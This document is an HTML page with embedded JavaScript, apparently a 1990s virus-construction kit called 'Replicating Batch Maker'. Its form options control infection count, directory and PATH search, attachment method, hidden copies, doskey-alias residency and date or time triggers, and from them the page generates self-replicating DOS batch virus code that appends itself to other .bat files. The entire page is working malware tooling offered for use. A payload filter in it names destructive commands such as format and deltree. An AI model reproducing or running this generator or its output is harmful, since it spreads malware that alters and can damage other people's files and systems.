<html><head><title>Don't load this! Browse RBM.HTM to run</title><script>
//<plaintext>

// Replicating Batch Maker
// run from RBM.HTM to initialize frames.
// output is sent to parent.OutWindow

// set these to preference
var cmpchar="'";
var cntchar="-";
var dos5t="$v$";
var copybase="c:\\_";
var comspec="command";
var eshell="/e:5000";

// initial variables
function Reset(vars) {
 with (document) {
  vars.Method.options[0].selected=true;
  vars.Search.options[0].selected=true;
  vars.Sub.value = "vstart";
  vars.Key.value = "ViR";
  vars.Infects.value = "1";
  vars.Seeks.value = "";
  vars.Runs.value = "";
  vars.Once.checked=false;
  vars.Text.checked=true;
  vars.FindHost.checked=false;
  vars.UseCopy.checked=true;
  vars.HideCopy.checked=false;
  vars.EchoBlank.checked=false;
  vars.UseDOS6.checked=true;
  vars.Cripple.checked=true;
  vars.AddCode.value="";
  vars.TMatch1.value="";
  vars.TMatch2.value="";
  vars.DMatch1.value="";
  vars.DMatch2.value="";
  vars.ResCommand.value="";
  MakeBug(vars);
 }
}
function updatemask(vars) {
 search=0;
 for (var i=0; i<5; i++) if (vars.Search.options[i].selected) search=i;
 mask="*.bat";
 dopath=false;
 if (search==1) mask="*.bat ..\\*.bat";
 if (search==2) mask="*.bat ..\\*.bat \\*.bat";
 if (search==3) {
  mask=". .. %path%";
  dopath=true;
 }
 if (search==4) {
  mask=". .. \\ %path%";
  dopath=true;
 }
}
function clear() {
 parent.OutWindow.document.close();
 parent.OutWindow.document.open();
 parent.OutWindow.document.write("<p>");
}
function write(stuff) {
  parent.OutWindow.document.writeln(stuff);
}
function wr(stuff) {
  parent.OutWindow.document.write(stuff);
}

function MakeBug(vars) {
 updatemask(vars);
 method=0;
 for (var i=0; i<4; i++)
   if (vars.Method.options[i].selected) method=i;
 sub=vars.Sub.value;
 key=vars.Key.value;
 infects=vars.Infects.value;
 seeks=vars.Seeks.value;
 runs=vars.Runs.value;
 findhost=vars.FindHost.checked;
 usecopy=vars.UseCopy.checked;
 hidecopy=vars.HideCopy.checked;
 echoblank=vars.EchoBlank.checked;
 usedos6=vars.UseDOS6.checked;
 cripple=vars.Cripple.checked;
 once=vars.Once.checked;
 text=vars.Text.checked;
 tmatch1=vars.TMatch1.value;
 tmatch2=vars.TMatch2.value;
 dmatch1=vars.DMatch1.value;
 dmatch2=vars.DMatch2.value;
 addcode=vars.AddCode.value;
 rescommand=vars.ResCommand.value;
 clear(); 
 if (method==0 && findhost)
   write("<h3>Error - Appending types cannot find host</h3>");
 else if (method==0 && !usecopy)
   write("<h3>Error - Appending types must use copy</h3>"); 
 else if (key=="")
   write("<h3>Error - Must have Key string entry</h3>");
 else if (sub=="")
   write("<h3>Error - Must have Substring entry</h3>");
 else if (sub.indexOf(key)>=0)
   write("<h3>Error - Key cannot be in SubString</h3>");
 else if (rescommand!="" && !usecopy)
   write("<h3>Error - Use Copy required to use Resident Command</h3>");
 else if (rescommand!="" && (method==2||method==3))
   write("<h3>Error - Must be Inserting or Appending to use Alias</h3>");
 else {
  wr("<pre>");
  GenerateCode();
  write("</pre><br>");
 }
}

function GenerateCode() {
 var type=method+1;
 var s_infects="";
 if (parseInt(infects)>0)
  for (var i=0; i<parseInt(infects); i++)
   s_infects=s_infects+cntchar;
 var s_seeks="";
 if (parseInt(seeks)>0)
  for (var i=0; i<parseInt(seeks); i++)
   s_seeks=s_seeks+cntchar;
 var s_runs="";
 if (parseInt(runs)>0)
  for (var i=0; i<parseInt(runs); i++)
   s_runs=s_runs+cntchar;
 var optimize=false;
 if (s_infects=="" && s_seeks=="" && !dopath) optimize=true;
 var v1="%"+key+"%";
 if (usecopy) v1=copybase+key;
 var v8="e";
 if (type==2) v8="x"; 
 if (type==3 || type==4) {
  write("@if "+cmpchar+"%_"+sub+"%=="+cmpchar+" goto _"+sub);
  write("::**** HOST ****");
  if (echoblank) write("");  
  write("@if not "+cmpchar+"%_"+sub+"%=="+cmpchar+" goto "+key+"e");

  if (key.toLowerCase()==sub.toLowerCase())
    write(":_"+key);
  else write(":_"+sub+" "+key);
 }
 if (type==1) {
  write("::**** HOST ****");
  if (echoblank) write("");
 }
 write("@echo off%_"+key+"%");
 write("if "+cmpchar+"%1=="+cmpchar+key+" goto "+key+"%2");
 if (rescommand!="") {
  if (rescommand=="cls") write("if "+cmpchar+"%1=="+cmpchar+"!"+key+" cls");
  else write("if "+cmpchar+"%1=="+cmpchar+"!"+key+" echo [1A[K[2A");
 }
 var cripple1=cripple && usecopy && !findhost && (type==1 || type==2);
 if (cripple1) {
  write("if exist "+copybase+key+".bat goto "+key+"g");
  write("if not exist %0.bat goto "+key+"e");
  write("find &quot;"+key+"&quot;&lt;%0.bat>"+copybase+key+".bat");
  if (hidecopy) write("attrib "+copybase+key+".bat +h");
  write(":"+key+"g");
 } else {
  write("set "+key+"=%0.bat");
  write("if not exist %"+key+"% set "+key+"=%0");
  write("if "+cmpchar+"%"+key+"%=="+cmpchar+" set "+key+"=autoexec.bat");
  if (type==3||type==4) write("set !"+key+"=%1 %2 %3 %4 %5 %6 %7 %8 %9");
  if (type==4) {
   write("call %"+key+"% "+key+" r");
   write("set _"+sub+"=%_"+key+"%");
   write("set !"+key+"=");
  }
  if (usecopy) write("if exist "+copybase+key+".bat goto "+key+"g");
  if (findhost) {
   write("if exist %"+key+"% goto "+key+"f");
   write("call %"+key+"% "+key+" h %path%");
   write("if exist %"+key+"% goto "+key+"f");
   write("goto e"+key);
   write(":"+key+"h");
   write("shift%_"+key+"%");
   write("if "+cmpchar+"%2=="+cmpchar+" goto "+key+v8);
   write("if exist %2\\%"+key+" set "+key+"=%2\\%"+key+"%");
   write("if exist %2%"+key+" set "+key+"=%2%"+key+"%");
   write("if exist %2\\%"+key+".bat set "+key+"=%2\\%"+key+"%.bat");
   write("if exist %2%"+key+".bat set "+key+"=%2%"+key+"%.bat");
   write("if not exist %"+key+"% goto "+key+"h");
   write("goto "+key+v8);
   write(":"+key+"f");
  }
  if (usecopy) {
   if(!findhost) write("if not exist %"+key+"% goto e"+key);
   write("find &quot;"+key+"&quot;&lt;%"+key+"%>"+copybase+key+".bat");
   if (hidecopy) write("attrib "+copybase+key+".bat +h");
   write(":"+key+"g");
  }
  if (!usecopy&&!findhost) write("if not exist %"+key+"% goto e"+key);
 }
 if (s_runs!="") {
  write("if "+cmpchar+"%!"+key+"%=="+cmpchar+s_runs+" goto "+key+"e");
  write("set !"+key+"=%!"+key+"%"+cntchar);
 }
 if (!optimize) {
  var v3=eshell+" /c";
  if (s_seeks==""&&(s_infects==""||s_infects==cntchar)) v3="/c";
  if (dopath) write(comspec+" "+v3+" "+v1+" "+key+" v "+mask);
  else write(comspec+" "+v3+" "+v1+" "+key+" v");
 } else {
  write("for %%a in ("+mask+") do call "+v1+" "+key+" i %%a");
 }
 if (rescommand!="") {
  if (rescommand=="cls") write("doskey "+rescommand+"="+v1+" !"+key+">nul");
  else write("doskey "+rescommand+"="+v1+" !"+key+"$t"+rescommand+" $*>nul");
 }
 if (!cripple1 || s_runs!="") write(":e"+key);
 var activate=false;
 var v14f=usedos6 && (type==1||type==2) && cripple
 var v14="n"+key; if (v14f) v14=key+"e";
 if (once) write("if not "+cmpchar+"%x"+key+"%=="+cmpchar+" goto "+v14);
 if (dmatch1!="") {
  if (usedos6) {
  write("echo.|date|find &quot;"+dmatch1+"&quot;>nul."+key);
  write("if errorlevel 1 goto "+v14);
  } else {
   write("echo.|date|find &quot;"+dmatch1+"&quot;>"+dos5t+"1%_"+key+"%");
   write("copy "+dos5t+"1 "+dos5t+"2>nul."+key);
   write("del "+dos5t+"1>nul."+key);
   write("if not exist "+dos5t+"2 goto n"+key);
   write("del "+dos5t+"2>nul."+key);
  }
  activate=true;
 }
 if (dmatch2!="") {
  if (usedos6) {
  write("echo.|date|find &quot;"+dmatch2+"&quot;>nul."+key);
  write("if errorlevel 1 goto "+v14);
  } else {
   write("echo.|date|find &quot;"+dmatch2+"&quot;>"+dos5t+"1%_"+key+"%");
   write("copy "+dos5t+"1 "+dos5t+"2>nul."+key);
   write("del "+dos5t+"1>nul."+key);
   write("if not exist "+dos5t+"2 goto n"+key);
   write("del "+dos5t+"2>nul."+key);
  }
  activate=true;
 }
 if (tmatch1!="") {
  if (usedos6) {
  write("echo.|time|find &quot;"+tmatch1+"&quot;>nul."+key);
  write("if errorlevel 1 goto "+v14);
  } else {
   write("echo.|time|find &quot;"+tmatch1+"&quot;>"+dos5t+"1%_"+key+"%");
   write("copy "+dos5t+"1 "+dos5t+"2>nul."+key);
   write("del "+dos5t+"1>nul."+key);
   write("if not exist "+dos5t+"2 goto n"+key);
   write("del "+dos5t+"2>nul."+key);
  }
  activate=true;
 }
 if (tmatch2!="") {
  if (usedos6) {
  write("echo.|time|find &quot;"+tmatch2+"&quot;>nul."+key);
  write("if errorlevel 1 goto "+v14);
  } else {
   write("echo.|time|find &quot;"+tmatch2+"&quot;>"+dos5t+"1%_"+key+"%");
   write("copy "+dos5t+"1 "+dos5t+"2>nul."+key);
   write("del "+dos5t+"1>nul."+key);
   write("if not exist "+dos5t+"2 goto n"+key);
   write("del "+dos5t+"2>nul."+key);
  }
  activate=true;
 }
 if (addcode.length>0 && !text) {
  var ac1=addcode.toLowerCase();
  if (ac1.indexOf("format ",0)>=0||ac1.indexOf("deltree",0)>=0||
     ((ac1.indexOf("*.",0)>=0||ac1.indexOf("c:\\")>=0)&&
      (ac1.indexOf("del",0)>=0||ac1.indexOf("erase",0)>=0)))
        addcode=":: corrupted code removed\r"; }
 var setecho=addcode.length>399;
 if ((text && setecho)||once) write ("set x"+key+"=echo");
 if (addcode.length>0) {
  var v13="%x"+key+"%";
  if (!setecho && !once) v13="echo%_"+key+"%";
  var fromchar=0;
  var newln=0;
  while(fromchar<addcode.length && newln>=0) {
   var newln=addcode.indexOf("\r",fromchar)
   if (newln>0) {
    var subline=addcode.substring(fromchar,newln);
    if (subline!="") {
     if (subline.indexOf(key)<0 && !text) {
      var sublow=subline.toLowerCase();
      if (sublow.substring(0,1)==":" ||
        sublow.indexOf("goto ")>=0)
          subline=subline+" %_"+key+"%";
      else subline=subline+"%_"+key+"%";
     }
     if (!text) write(subline);
     else { 
      var charpos=subline.indexOf("<");
      while (charpos>=0) {
       if (charpos>0) var nline=subline.substring(0,charpos);
       else var nline="";
       nline=nline+"{";
       if (charpos<subline.length)
          nline=nline+subline.substring(charpos+1,subline.length);
       subline=nline;
       charpos=subline.indexOf("<");
      }
      charpos=subline.indexOf(">");
      while (charpos>=0) {
       if (charpos>0) var nline=subline.substring(0,charpos);
       else var nline="";
       nline=nline+"}";
       if (charpos<subline.length)
          nline=nline+subline.substring(charpos+1,subline.length);
       subline=nline;
       charpos=subline.indexOf(">");
      }
      charpos=subline.indexOf("|");
      while (charpos>=0) {
       if (charpos>0) var nline=subline.substring(0,charpos);
       else var nline="";
       nline=nline+"�";
       if (charpos<subline.length)
          nline=nline+subline.substring(charpos+1,subline.length);
       subline=nline;
       charpos=subline.indexOf("|");
      }
      write(v13+" "+subline);
     }
    }
    else if (text) write(v13+".");
   }
   else if (text) write(v13+".");
   fromchar=newln+2;
  }
 }
 else if (activate||once) write ("::"+key+" *** activate code ***");
 if (!once && setecho && text) write("set x"+key+"=");
 if (!v14f && (activate||once)) write(":n"+key);
 if (!usedos6) write("if exist "+dos5t+"? del "+dos5t+"?>nul."+key);
 if (type==3) {
  write("call %"+key+"% "+key+" r");
  if (key.toLowerCase()==sub.toLowerCase())
    write("set _"+key+"=");
  else write("set _"+sub+"=%_"+key+"%");
  write("set !"+key+"=");
 }
 if (!cripple1) write("set "+key+"=");
 if ((!usecopy||findhost) && type==2)
   write("if exist \\!"+key+".bat del \\!"+key+".bat");
 write("goto "+key+"e");
 if ((!usecopy||findhost) && type==2) {
  write(":"+key+"x");
  write("echo.>\\!"+key+".bat");
  write("\\!"+key+".bat");
 }
 if (type==3||type==4) {
  write(":"+key+"r");
  if (key.toLowerCase()==sub.toLowerCase())
    write("set _"+key+"=x");
  else write("set _"+sub+"=x%_"+key+"%");
  write("%"+key+"% %!"+key+"%");
 }
 if (!optimize) {
  write(":"+key+"v");
  if (!dopath) {
   write("for %%a in ("+mask+") do call "+v1+" "+key+" i %%a ");
   write("exit "+key);
  } else {
   write("shift%_"+key+"%");
   write("if "+cmpchar+"%2=="+cmpchar+" exit "+key);
   write("for %%a in (%2\\*.bat %2*.bat) do call "+v1+" "+key+" i %%a ");
   write("goto "+key+"v");
  }
 }
 write(":"+key+"i");
 var v2="";
 var cripple2=cripple && usedos6 && !echoblank &&
          type==1 && s_seeks=="" && s_infects=="";
 if (s_seeks=="") v2=key+"e";
 if (type==2 && !usecopy) v2=key+"x";
 if (s_seeks!="") v2=key+"j";
 if (usedos6) {
  write("find &quot;"+key+"&quot;&lt;%3>nul");
  if (!cripple2) write("if not errorlevel 1 goto "+v2);
  else write("if errorlevel 1 type "+copybase+key+".bat>>%3");
 } else {
  write("if exist "+dos5t+"? del "+dos5t+"?>nul."+key);
  write("find &quot;"+key+"&quot;&lt;%3>"+dos5t+"1");
  write("copy "+dos5t+"1 "+dos5t+"2>nul."+key);
  write("if exist "+dos5t+"2 goto "+v2);
 }
 if (type==1 && cripple && !echoblank) {
   if (!cripple2) write("type "+copybase+key+".bat>>%3");
 } else {
  var v2="type "+copybase+key+".bat";
  if (!usecopy) var v2="find &quot;"+key+"&quot;&lt;%"+key+"%";
  if (type==1) {
   write("type %3>"+key+"$");
   if (echoblank) write("echo.>>"+key+"$");
   write(v2+">>"+key+"$");
  }
  if (type==2) {
   write(v2+">"+key+"$");
   write("type %3>>"+key+"$");
  }
  if (type==3||type==4) {
   write("echo @if "+cmpchar+"%%_"+sub+"%%=="+cmpchar+
         " goto _"+sub+">"+key+"$");
   write("type %3>>"+key+"$");
   if (echoblank) write("echo.>>"+key+"$");
   write(v2+">>"+key+"$");
  } 
  if (usedos6) write("move "+key+"$ %3>nul");
  else {
   write("copy "+key+"$ %3>nul");
   write("del "+key+"$");
  }
 }
 if (s_infects!="") {
  if (s_infects==cntchar) write("exit "+key);
  else {
   write("set "+key+"#=%"+key+"#%"+cntchar);
   write("if %"+key+"#%=="+s_infects+" exit ");
  }
 }
 if (s_seeks!="") {
  write(":"+key+"j");
  write("set "+key+"!=%"+key+"!%"+cntchar);
  write("if %"+key+"!%=="+s_seeks+" exit ");
 }
 if ((s_infects!=cntchar||s_seeks!="")&&type==2&&!usecopy)
   write("goto "+key+"x");
 write(":"+key+"e");
 if (type==2) write("::**** HOST ****"); 
}

// initialise globals
var cripple=false;var once=false;var mask="";
var method=0;var search=0;var sub="";var key="";var infects="";
var dopath=false;var text=false;var rescommand="";var seeks="";
var runs="";var findhost=false;var usecopy=false;var usedos6=false;
var tmatch1="";var tmatch2="";var dmatch1="";var dmatch2="";
var addcode="";var hidecopy=false;var echoblank=false;

</script></head>

<body><form name="vars"><center>
<h2>Replicating Batch Maker</h2>
KeyString <input type="text" name="Key" size=7 maxlength=7> �
SubString <input type="text" name="Sub" size=7 maxlength=7><br>
Infects per run <input type="text" name="Infects" size=2 maxlength=2> �
Seeks per run <input type="text" name="Seeks" size=2 maxlength=2><br>
Runs per session <input type="text" name="Runs" size=2 maxlength=2> �
Doskey alias <input type="text" name="ResCommand" size=4><br>
Attachment Method <select name="Method">
<option>Appending
<option>Inserting
<option>Compound Immediate
<option>Compound Delayed
</select><br>
Search Strategy <select name="Search">
<option>Current Only
<option>Current Parent
<option>Current Parent Root
<option>Current Parent Path
<option>Current Parent Root Path
</select><br>
<textarea name="AddCode" rows=3 cols=28></textarea><br>
Time <input type="text" name="TMatch1" size=6>
<input type="text" name="TMatch2" size=6>
<input type="checkbox" name="Text">DisplayText<br>
Date <input type="text" name="DMatch1" size=6>
<input type="text" name="DMatch2" size=6>
<input type="checkbox" name="Once">ActivateOnce<br>
<input type="checkbox" name="FindHost">FindHost
<input type="checkbox" name="UseCopy">UseCopy
<input type="checkbox" name="HideCopy">HideCopy<br>
<input type="checkbox" name="EchoBlank">EchoBlank
<input type="checkbox" name="UseDOS6">UseDOS6
<input type="checkbox" name="Cripple">Cripple<br>
<input type="button" value="Generate Code" onclick="MakeBug(this.form)">
<input type="reset" value="Reset" onclick="Reset()">
</center></form></body>
<script>
with (document) if (vars.Key.value=="") Reset();
</script>
</html>
